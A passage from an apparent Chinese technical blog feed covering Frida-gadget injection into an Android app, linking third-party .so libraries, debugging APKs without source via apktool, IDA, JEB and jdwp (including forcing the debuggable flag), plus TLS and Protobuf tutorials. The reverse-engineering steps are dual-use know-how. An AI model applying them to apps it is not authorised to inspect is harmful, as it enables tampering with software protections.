class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后再通过<code>System.loadLibrary(&quot;gadget&quot;)</code>加载。</p><p>编辑gadget的配置文件：</p><p>在libgadget.so库所在文件夹下，新建libgadget.config.so文件，其中libxxx.config.so中的xxx与libxxx.so保持一致，文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;interaction&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: &quot;script&quot;,</span><br><span class="line">    &quot;path&quot;: &quot;/data/local/tmp/myscript.js&quot;,</span><br><span class="line">    &quot;on_change&quot;: &quot;reload&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>具体关于命名的规则可参考：<a href="https://lief.quarkslab.com/doc/latest/tutorials/09_frida_lief.html" target="_blank" rel="noopener">https://lief.quarkslab.com/doc/latest/tutorials/09_frida_lief.html</a></p><p>编辑myscript.js文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&apos;use strict&apos;;</span><br><span class="line"></span><br><span class="line">console.log(&quot;Waiting for Java..&quot;);</span><br><span class="line"></span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">  var Log = Java.use(&quot;android.util.Log&quot;);</span><br><span class="line">  Log.v(&quot;frida-lief&quot;, &quot;Have fun!&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>将myscript.js推入/data/local/tmp下，赋予可执行权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push myscript.js /data/local/tmp</span><br><span class="line"></span><br><span class="line">adb shell chmod 777 /data//local/tmp/myscript.js</span><br></pre></td></tr></table></figure></p><p>构建App，并运行观察logcat，可看到日志输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Have fun!</span><br></pre></td></tr></table></figure></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>重点在于在Android studio中调用第三库的相关配置和使用gadget时需要注意的文件规范（配置文件与so库需在同一目录下，二者命名需一致，配置文件添加.so后缀）。</p>]]></content>
      
      
      <categories>
          
          <category> Android钩子 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android Studio调用第三方so库</title>
      <link href="/2019/01/10/Android-studio%E8%B0%83%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9so%E5%BA%93/"/>
      <url>/2019/01/10/Android-studio%E8%B0%83%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9so%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-studio调用第三方so库"><a href="#Android-studio调用第三方so库" class="headerlink" title="Android studio调用第三方so库"></a>Android studio调用第三方so库</h1><ol><li>将so库拷贝到工程下的libs文件下<strong>与平台CPU类型对应</strong>的文件下，如：armeabi/、armeabi-v7a/、armeabi-v8a/、x86/、x86_64/等，<br>可通过<code>adb shell cat /prop/cpuinfo</code>命令查看平台CPU信息。</li></ol><p>构建时可能会遇到的问题：</p><p>提示缺少某个平台的so库</p><p>在build.gradle的externNativeBuild{}中添加如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ndk&#123;</span><br><span class="line">    abiFilters &quot;armeabi-v7a&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">so库找不到</span><br><span class="line"></span><br><span class="line">检查第三方库名字是否是libxxx.so样式</span><br></pre></td></tr></table></figure></p><ol start="2"><li>在app下的build.gradle的android{}中配置如下信息，然后重新编译<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sourceSets.main &#123;</span><br><span class="line">    jniLibs.srcDirs = [&apos;libs&apos;]</span><br><span class="line">    jni.srcDirs = []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>到这一步，就可以在Java代码中通过System.load()单独加载。但如果想要同本地的so库交互，就还需要以下的配置。</p><ol start="3"><li>在CmakeLists.txt中添加如下配置信息<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#设置so库路径</span><br><span class="line">set(my_lib_path $&#123;CMAKE_SOURCE_DIR&#125;/libs)</span><br><span class="line"></span><br><span class="line">#将第三方库作为动态库引用</span><br><span class="line">add_library( gadget</span><br><span class="line">             SHARED</span><br><span class="line">             IMPORTED )</span><br><span class="line"></span><br><span class="line">#指名第三方库的绝对路径</span><br><span class="line">set_target_properties( gadget</span><br><span class="line">                       PROPERTIES IMPORTED_LOCATION</span><br><span class="line">                       $&#123;my_lib_path&#125;/$&#123;ANDROID_ABI&#125;/libgadget.so)</span><br><span class="line">#链接本地库和第三方库</span><br><span class="line">target_link_libraries( # Specifies the target library.</span><br><span class="line">                       native-lib  #本地库</span><br><span class="line">                       gadget</span><br><span class="line">                       $&#123;log-lib&#125; )</span><br></pre></td></tr></table></figure></li></ol><p>完成上述步骤后，尝试重新构建运行应用。</p>]]></content>
      
      
      <categories>
          
          <category> Android调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第三方so库调用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android无源码动态调试apk</title>
      <link href="/2019/01/09/Android%E6%97%A0%E6%BA%90%E7%A0%81%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95apk/"/>
      <url>/2019/01/09/Android%E6%97%A0%E6%BA%90%E7%A0%81%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95apk/</url>
      
        <content type="html"><![CDATA[<p>调试环境：</p><p>一台系统属性ro.debuggable = 1（意味着可调试）的真机</p><p>或者一台模拟器</p><p>或者使用mprop/BDOpener工具帮助修改系统ro.debuggable属性。</p><p>或者修改AndroidManifest.xml文件，添加或修改android:debuggable属性为true</p><h1 id="Android-studio-Smalidea-jdwp"><a href="#Android-studio-Smalidea-jdwp" class="headerlink" title="Android studio + Smalidea + jdwp"></a>Android studio + Smalidea + jdwp</h1><p>下载<a href="https://github.com/JesusFreke/smali/wiki/smalidea" target="_blank" rel="noopener">smalidea</a>，否则无法在smali代码行下断点。</p><p>导入Android studio</p><blockquote><p>preferences -&gt;plugins -&gt;install from disk</p></blockquote><p>使用apktool或baksmali反编译apk，得到包含smail文件夹的apk文件夹。</p><blockquote><p>apktool d demo.apk</p></blockquote><p>将反编译得到的apk文件夹使用Android studio打开</p><blockquote><p>打开Android studio</p><p>import project(Gradle,Eclipse ADT,etc)</p><p>右击项目文件夹，”Mark Directory As” -&gt; “Sources Root”</p><p>右击项目文件夹，”Open Module Settings” 配置 Project SDK</p><p>点击 “Edit Configurations”，点击”+” -&gt;”Remote”，随意输入名字，其他不用改，点击”Apply”,”OK”</p></blockquote><p>将端口5005(默认)转发到应用进程</p><blockquote><p>adb shell ps|grep xxx</p><p>adb forward tcp:5005 jdwp:xxx’pid</p></blockquote><p>打开smail文件夹，在想要断点的smail代码行下断点，点击debug按钮</p><p><strong>期间可能遇到的问题</strong>：</p><p>conection prematurally closed.</p><p>解决方法：</p><blockquote><p>重启Android studio</p></blockquote><p>connection refused.</p><p>解决方法：</p><blockquote><p>重新使用adb forward 转发端口</p></blockquote><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>将apk文件拖入ida窗口，在弹出的窗口中选择classes.dex文件。</p><p>点击Debug -&gt;Dubugger Options -&gt;选中Suspend on process entry point, “Set specific options” -&gt;设置adb executable路径，填入apk包名和入口activity。</p><p>点击Debug -&gt;Process Options -&gt;设置port为8700</p><p>在想要断点的smail代码行下断点。</p><p>点击”绿色按钮” </p><p><strong>期间可能遇到的问题</strong>：  </p><p>8700 already in use.</p><p>解决方法：</p><blockquote><p>关闭占用8700端口的进程，常见的如：DDMS, Android studio等</p></blockquote><h1 id="Jeb"><a href="#Jeb" class="headerlink" title="Jeb"></a>Jeb</h1><p>Mac需要设置adb路径为全局（其他应用也能够使用，~/.bash_profile中设置只在终端有效）。window只需要将adb路径加入系统环境变量PATH中。</p><p>将apk拖入jeb窗口，在想要断点的smail代码行下断点</p><p>点击Debugger -&gt;start, 选择要调试的应用 -&gt; attach</p>]]></content>
      
      
      <categories>
          
          <category> Android调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android动态调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TLS/SSL协议</title>
      <link href="/2019/01/08/TLS-SSL%E5%8D%8F%E8%AE%AE/"/>
      <url>/2019/01/08/TLS-SSL%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是SSL、TLS、HTTPS"><a href="#什么是SSL、TLS、HTTPS" class="headerlink" title="什么是SSL、TLS、HTTPS"></a>什么是SSL、TLS、HTTPS</h1><p>SSL:Secure Sockets Layer（安全套接层）最初由Netscape开发，早在1995年以SSL2.0的方式发布（SSL1.0从未对公众发布）。在一些漏洞被发现后，版本2.0在1996年被版本3.0取代。</p><p>TLS:Transport Layer Security（安全传输层）以SSL3.0为基础在1999年作为SSL的新版本推出。同时SSL3.0在2015年被IEFT组织废弃。TLS1.0通常被标识为SSL3.1，TLS1.1为SSL3.2，TLS 1.2为SSL3.3。</p><p>HTTPS：HTTP OVER TLS（建立在TLS之上的HTTP协议）。</p><h1 id="HTTP与HTTPS的区别"><a href="#HTTP与HTTPS的区别" class="headerlink" title="HTTP与HTTPS的区别"></a>HTTP与HTTPS的区别</h1><p>HTTP连接方式简单，无状态，使用80端口，HTTPS由SSL+HTTP构建的可实现身份认证和安全传输的网络协议，使用443端口。</p><p>HTTPS能够提供：</p><ul><li><p>数据完整性：内容传输经过完整性校验</p></li><li><p>数据隐私性：内容经过对称加密，每个连接生成一个唯一的加密密钥</p></li><li><p>身份认证：第三方无法伪造服务端(客户端)身份</p></li></ul><p>其中，数据完整性和隐私性由TLS Record Protocol保证，身份认证由TLS Handshaking Protocols实现。</p><p>完整的HTTPS连接建立大概需要以下几步：  </p><ol><li>DNS查询，获取IP地址</li><li>TCP握手，建立连接</li><li>TLS握手，确定加密方式和密钥</li><li>建立HTTP连接，交换数据</li></ol><h1 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h1><p>证书包含的信息：</p><ol><li>证书信息：序列号，过期日期</li><li>所有者信息：姓名等</li><li>所有者公钥</li></ol><p>为什么需要服务端发送证书给客户端？</p><p>互联网有太多的服务需要使用证书来验证身份，以至于客户端(操作系统或浏览器等)无法内置所有证书，需要通过服务端将证书发送给客户端。</p><p>客户端为什么需要验证接收到的证书？</p><p>为了防止中间人攻击。攻击者拦截服务端响应，将伪造证书发送给客户端，客户端若未验证地使用证书中的公钥加密传输数据，就会被攻击者通过私钥解密得到明文数据。</p><p>客户端如何验证接收到的证书？  </p><p>通过数字签名(将一段数据通过哈希和私钥加密后生成数字签名)。消息发送方通过将一段文本和数字签名一起发送给消息接收方，接收方接收到数据后，将文本通过哈希得到散列值，同时使用公钥解密数字签名得到原散列值，通过比对计算得到的散列值和原散列值判断接收到的文本是否为对应的消息发送方发出的。</p><p>该验证的前提是，消息接收方知道消息发送方的公钥。公钥和消息本身一样，不能直接通过不安全的网络发送给消息接收方。</p><p>此时就需要证书颁发机构（Certifate Authority，简称CA），客户端内置了所有受信任CA的证书，CA对服务端的公钥(和其他信息)数字签名后生成证书。</p><p>服务端将证书发送给客户端后，客户端使用证书公钥验证证书签名。</p><p>客户端信任CA，CA信任服务端，客户端信任服务端，从而形成信任链（chain of trust）。</p><p>事实上，客户端内置的是CA的根证书(Root Certificate)，HTTPS协议中服务器会发送证书链(Certificate Chain)给客户端。</p><h1 id="HTTPS基本原理"><a href="#HTTPS基本原理" class="headerlink" title="HTTPS基本原理"></a>HTTPS基本原理</h1><p><img src="https://www.wosign.com/info/info_images/20170606135810.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 数据包分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TLS </tag>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据传输协议框架</title>
      <link href="/2019/01/07/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%A1%86%E6%9E%B6/"/>
      <url>/2019/01/07/%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Protocol-Buffer"><a href="#Protocol-Buffer" class="headerlink" title="Protocol Buffer"></a>Protocol Buffer</h1><p>Google Protocol Buffer( 简称 Protobuf) 是 Google 公司内部的混合语言数据标准。Protocol Buffers 是一种轻便高效的结构化数据存储格式，可以用于结构化数据串行化，或者说序列化。它很适合做数据存储或 RPC 数据交换格式。可用于通讯协议、数据存储等领域的语言无关、平台无关、可扩展的序列化结构数据格式。支持python、Java、c++等语言。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="定义-proto文件"><a href="#定义-proto文件" class="headerlink" title="定义.proto文件"></a>定义.proto文件</h3><p>.proto文件中定义着一系列协议中的实体结构：</p><ul><li><p>message关键字表示一个实体结构，由多个字段组成</p><p>  例如：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">syntax = &quot;proto2&quot;;</span><br><span class="line"></span><br><span class="line">package tutorial;</span><br><span class="line"></span><br><span class="line">option java_package = &quot;com.example.tutorial&quot;;</span><br><span class="line">option java_outer_classname = &quot;AddressBookProtos&quot;;</span><br><span class="line"></span><br><span class="line">message Person &#123;</span><br><span class="line">    required string name = 1;</span><br><span class="line">    required int32 id = 2;</span><br><span class="line">    optional string email = 3;</span><br><span class="line"></span><br><span class="line">    enum PhoneType &#123;</span><br><span class="line">        MOBILE = 0;</span><br><span class="line">        HOME = 1;</span><br><span class="line">        WORK = 2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    message PhoneNumber &#123;</span><br><span class="line">        required string number = 1;</span><br><span class="line">        optional PhoneType type = 2 [default = HOME];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    repeated PhoneNumber phones = 4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message AddressBook &#123;</span><br><span class="line">    repeated Person people = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>字段包含修饰符、数据类型、唯一标识、初始值。</p><p>  三种修饰符：required、optional、repeated</p><p>  支持的数据类型：<br>  <img src="https://note.youdao.com/yws/api/personal/file/WEBd038acafb6eb2ec0003778c5413c963b?method=download&amp;shareKey=d4cdfcbeba2aaf600b311182eb01e5fb" alt="image"></p></li></ul><h3 id="编译-proto"><a href="#编译-proto" class="headerlink" title="编译.proto"></a>编译.proto</h3><p>使用protocol buffer的编译器将.proto文件编译为目标语言。</p><p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc -I=$SRC_DIR --java_out=$DST_DIR $SRC_DIR/xxx.proto</span><br></pre></td></tr></table></figure></p><p>-I 指定源路径，–java_out 选项指定生成java文件，编译完成会在目标路径下生成.java文件。</p><h3 id="Protocol-Buffer-API"><a href="#Protocol-Buffer-API" class="headerlink" title="Protocol Buffer API"></a>Protocol Buffer API</h3><p>.java 文件部分内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// required string name = 1;</span><br><span class="line">public boolean hasName();</span><br><span class="line">public String getName();</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// optional string email = 3;</span><br><span class="line">public boolean hasEmail();</span><br><span class="line">public String getEmail();</span><br></pre></td></tr></table></figure></p><p>Person.Builder类中也为每个字段生成getter和setter方法,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// required string name = 1;</span><br><span class="line">public boolean hasName();</span><br><span class="line">public java.lang.String getName();</span><br><span class="line">public Builder setName(String value);</span><br><span class="line">public Builder clearName();</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>创建Person实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Person john =</span><br><span class="line">  Person.newBuilder()</span><br><span class="line">    .setName(&quot;John Doe&quot;)</span><br><span class="line">    .setAge(15)</span><br><span class="line">    .setEmail(&quot;jdoe@example.com&quot;)</span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure></p><p>message类和Builder类中内建的其他方法：</p><ul><li>isInitialized(): checks if all the required fields have been set.</li><li>toString(): returns a human-readable representation of the message, particularly useful for debugging</li><li>mergeFrom(Message other): (builder only) merges the contents of other into this message, overwriting singular scalar fields, merging composite fields, and concatenating repeated fields.</li><li>clear(): (builder only) clears all the fields back to the empty state.</li></ul><h3 id="解析和序列化"><a href="#解析和序列化" class="headerlink" title="解析和序列化"></a>解析和序列化</h3><ul><li>byte[] toByteArray();: serializes the message and returns a byte array containing its raw bytes</li><li>static Person parseFrom(byte[] data);: parses a message from the given byte array</li><li>void writeTo(OutputStream output);: serializes the message and writes it to an OutputStream</li><li>static Person parseFrom(InputStream input);: reads and parses a message from an InputStream</li></ul><h2 id="完整实例"><a href="#完整实例" class="headerlink" title="完整实例"></a>完整实例</h2><h3 id="write-a-message"><a href="#write-a-message" class="headerlink" title="write a message"></a>write a message</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">import com.example.tutorial.AddressBookProtos.AddressBook;</span><br><span class="line">import com.example.tutorial.AddressBookProtos.Person;</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintStream;</span><br><span class="line"></span><br><span class="line">class AddPerson &#123;</span><br><span class="line">  // This function fills in a Person message based on user input.</span><br><span class="line">  static Person PromptForAddress(BufferedReader stdin,</span><br><span class="line">                                 PrintStream stdout) throws IOException &#123;</span><br><span class="line">    Person.Builder person = Person.newBuilder();</span><br><span class="line"></span><br><span class="line">    stdout.print(&quot;Enter person ID: &quot;);</span><br><span class="line">    person.setId(Integer.valueOf(stdin.readLine()));</span><br><span class="line"></span><br><span class="line">    stdout.print(&quot;Enter name: &quot;);</span><br><span class="line">    person.setName(stdin.readLine());</span><br><span class="line"></span><br><span class="line">    stdout.print(&quot;Enter email address (blank for none): &quot;);</span><br><span class="line">    String email = stdin.readLine();</span><br><span class="line">    if (email.length() &gt; 0) &#123;</span><br><span class="line">      person.setEmail(email);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    while (true) &#123;</span><br><span class="line">      stdout.print(&quot;Enter a phone number (or leave blank to finish): &quot;);</span><br><span class="line">      String number = stdin.readLine();</span><br><span class="line">      if (number.length() == 0) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Person.PhoneNumber.Builder phoneNumber =</span><br><span class="line">        Person.PhoneNumber.newBuilder().setNumber(number);</span><br><span class="line"></span><br><span class="line">      stdout.print(&quot;Is this a mobile, home, or work phone? &quot;);</span><br><span class="line">      String type = stdin.readLine();</span><br><span class="line">      if (type.equals(&quot;mobile&quot;)) &#123;</span><br><span class="line">        phoneNumber.setType(Person.PhoneType.MOBILE);</span><br><span class="line">      &#125; else if (type.equals(&quot;home&quot;)) &#123;</span><br><span class="line">        phoneNumber.setType(Person.PhoneType.HOME);</span><br><span class="line">      &#125; else if (type.equals(&quot;work&quot;)) &#123;</span><br><span class="line">        phoneNumber.setType(Person.PhoneType.WORK);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        stdout.println(&quot;Unknown phone type.  Using default.&quot;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      person.addPhones(phoneNumber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return person.build();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Main function:  Reads the entire address book from a file,</span><br><span class="line">  //   adds one person based on user input, then writes it back out to the same</span><br><span class="line">  //   file.</span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    if (args.length != 1) &#123;</span><br><span class="line">      System.err.println(&quot;Usage:  AddPerson ADDRESS_BOOK_FILE&quot;);</span><br><span class="line">      System.exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AddressBook.Builder addressBook = AddressBook.newBuilder();</span><br><span class="line"></span><br><span class="line">    // Read the existing address book.</span><br><span class="line">    try &#123;</span><br><span class="line">      addressBook.mergeFrom(new FileInputStream(args[0]));</span><br><span class="line">    &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">      System.out.println(args[0] + &quot;: File not found.  Creating a new file.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Add an address.</span><br><span class="line">    addressBook.addPeople(</span><br><span class="line">      PromptForAddress(new BufferedReader(new InputStreamReader(System.in)),</span><br><span class="line">                       System.out));</span><br><span class="line"></span><br><span class="line">    // Write the new address book back to disk.</span><br><span class="line">    FileOutputStream output = new FileOutputStream(args[0]);</span><br><span class="line">    addressBook.build().writeTo(output);</span><br><span class="line">    output.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="read-a-message"><a href="#read-a-message" class="headerlink" title="read a message"></a>read a message</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import com.example.tutorial.AddressBookProtos.AddressBook;</span><br><span class="line">import com.example.tutorial.AddressBookProtos.Person;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.PrintStream;</span><br><span class="line"></span><br><span class="line">class ListPeople &#123;</span><br><span class="line">  // Iterates though all people in the AddressBook and prints info about them.</span><br><span class="line">  static void Print(AddressBook addressBook) &#123;</span><br><span class="line">    for (Person person: addressBook.getPeopleList()) &#123;</span><br><span class="line">      System.out.println(&quot;Person ID: &quot; + person.getId());</span><br><span class="line">      System.out.println(&quot;  Name: &quot; + person.getName());</span><br><span class="line">      if (person.hasEmail()) &#123;</span><br><span class="line">        System.out.println(&quot;  E-mail address: &quot; + person.getEmail());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      for (Person.PhoneNumber phoneNumber : person.getPhonesList()) &#123;</span><br><span class="line">        switch (phoneNumber.getType()) &#123;</span><br><span class="line">          case MOBILE:</span><br><span class="line">            System.out.print(&quot;  Mobile phone #: &quot;);</span><br><span class="line">            break;</span><br><span class="line">          case HOME:</span><br><span class="line">            System.out.print(&quot;  Home phone #: &quot;);</span><br><span class="line">            break;</span><br><span class="line">          case WORK:</span><br><span class="line">            System.out.print(&quot;  Work phone #: &quot;);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(phoneNumber.getNumber());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Main function:  Reads the entire address book from a file and prints all</span><br><span class="line">  //   the information inside.</span><br><span class="line">  public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    if (args.length != 1) &#123;</span><br><span class="line">      System.err.println(&quot;Usage:  ListPeople ADDRESS_BOOK_FILE&quot;);</span><br><span class="line">      System.exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Read the existing address book.</span><br><span class="line">    AddressBook addressBook =</span><br><span class="line">      AddressBook.parseFrom(new FileInputStream(args[0]));</span><br><span class="line"></span><br><span class="line">    Print(addressBook);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Flat-Buffer"><a href="#Flat-Buffer" class="headerlink" title="Flat Buffer"></a>Flat Buffer</h1><p>FlatBuffers是一个跨平台的序列化库，旨在实现最高的内存效率。实现了与 Protocol Buffers，Thrift，Apache Avro，SBE 和 Cap’n Proto 类似的序列化格式。它允许我们直接访问序列化数据，而无需先解析/解压缩，同时仍具有良好的向前/向后兼容性。其最初为 Android 游戏和注重性能的应用而开发了FlatBuffers。</p><p>FlatBuffers 的主要目标是避免反序列化。这是通过定义二进制数据协议来实现的，一种将定义好的将数据转换为二进制数据的方法。由该协议创建的二进制结构可以 wire 